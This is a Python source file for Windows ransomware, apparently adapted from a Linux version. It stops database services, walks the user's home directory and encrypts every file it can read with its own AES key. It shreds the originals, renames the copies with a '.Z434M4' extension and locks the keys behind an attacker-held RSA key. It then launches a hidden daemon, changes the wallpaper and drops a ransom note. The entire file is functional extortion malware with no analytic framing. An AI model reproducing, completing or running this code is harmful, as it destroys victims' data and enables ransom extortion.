import variables
import asymmetric
import get_files
import symmetric
import environment
import generate_keys
import utils

import os
import string
import random
import base64
import pickle
import gc
import subprocess
import ctypes

from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes


def kill_databases():
    if utils.amiroot():  # Use Windows admin check
        # Stop SQL Server
        os.system('net stop MSSQLSERVER /y >nul 2>&1')
        # Stop MySQL
        os.system('net stop MySQL /y >nul 2>&1')
        # Stop MongoDB
        os.system('net stop MongoDB /y >nul 2>&1')
        # Stop PostgreSQL
        os.system('net stop postgresql-x64-14 /y >nul 2>&1')


def encrypt_priv_key(msg, key):
    n = 127
    x = [msg[i:i+n] for i in range(0, len(msg), n)]
    
    # Load the key for cryptography library
    server_public_key = serialization.load_pem_public_key(key)
    
    encrypted = []
    for i in x:
        ciphertext = server_public_key.encrypt(
            i,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        encrypted.append(ciphertext)
    return encrypted


def start_encryption(files):
    AES_and_base64_path = []
    for found_file in files:
        key = generate_keys.generate_key(128, True)
        AES_obj = symmetric.AESCipher(key)
        
        found_file = base64.b64decode(found_file)

        try:
            with open(found_file, 'rb') as f:
                file_content = f.read()
        except:
            continue

        encrypted = AES_obj.encrypt(file_content)
        utils.shred(found_file)

        new_file_name = found_file.decode('utf-8') + ".Z434M4"  # Changed extension
        with open(new_file_name, 'wb') as f:
            f.write(encrypted)

        base64_new_file_name = base64.b64encode(new_file_name.encode('utf-8'))

        AES_and_base64_path.append((key, base64_new_file_name))
    return AES_and_base64_path


def menu():
    try:
        os.makedirs(variables.test_path, exist_ok=True)  # Windows-friendly directory creation
    except OSError:
        pass

    kill_databases()
        
    files = get_files.find_files(os.path.expanduser('~'))  # Use Windows home directory

    rsa_object = asymmetric.assymetric()
    rsa_object.generate_keys()
    
    Client_private_key = rsa_object.private_key_PEM
    Client_public_key = rsa_object.public_key_PEM
    encrypted_client_private_key = encrypt_priv_key(Client_private_key,
                                                    variables.server_public_key.encode('utf-8'))
    
    # Ensure directory exists
    os.makedirs(os.path.dirname(variables.encrypted_client_private_key_path), exist_ok=True)
    
    with open(variables.encrypted_client_private_key_path, 'wb') as output:
        pickle.dump(encrypted_client_private_key, output, pickle.HIGHEST_PROTOCOL)
    
    with open(variables.client_public_key_path, 'wb') as f:
        f.write(Client_public_key)
    
    Client_private_key = None
    rsa_object = None
    del rsa_object
    del Client_private_key
    gc.collect()
    
    client_public_key_object = serialization.load_pem_public_key(Client_public_key)

    # FILE ENCRYPTION STARTS HERE !!!
    aes_keys_and_base64_path = start_encryption(files)
    enc_aes_key_and_base64_path = []

    for _ in aes_keys_and_base64_path:
        aes_key = _[0]
        base64_path = _[1]

        encrypted_aes_key = client_public_key_object.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        enc_aes_key_and_base64_path.append((encrypted_aes_key, base64_path))
    
    aes_keys_and_base64_path = None
    del aes_keys_and_base64_path
    gc.collect()

    # Ensure directory exists
    os.makedirs(os.path.dirname(variables.aes_encrypted_keys_path), exist_ok=True)
    
    with open(variables.aes_encrypted_keys_path, 'w') as f:
        for _ in enc_aes_key_and_base64_path:
            line = base64.b64encode(_[0]).decode('utf-8') + " " + _[1].decode('utf-8') + "\n"
            f.write(line)

    enc_aes_key_and_base64_path = None
    del enc_aes_key_and_base64_path
    gc.collect()


def drop_daemon_and_decryptor():
    # Ensure directories exist
    os.makedirs(os.path.dirname(variables.decryptor_path), exist_ok=True)
    
    with open(variables.decryptor_path, 'wb') as f:
        f.write(base64.b64decode(variables.decryptor))

    with open(variables.daemon_path, 'wb') as f:
        f.write(base64.b64decode(variables.daemon))

    # Windows doesn't need chmod, but we need to ensure the files are executable
    # Start the daemon process
    subprocess.Popen([variables.daemon_path], shell=True,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


if __name__ == "__main__":
    menu()
    utils.change_wallpaper()
    drop_daemon_and_decryptor()
    # Create ransom note
    utils.create_ransom_note()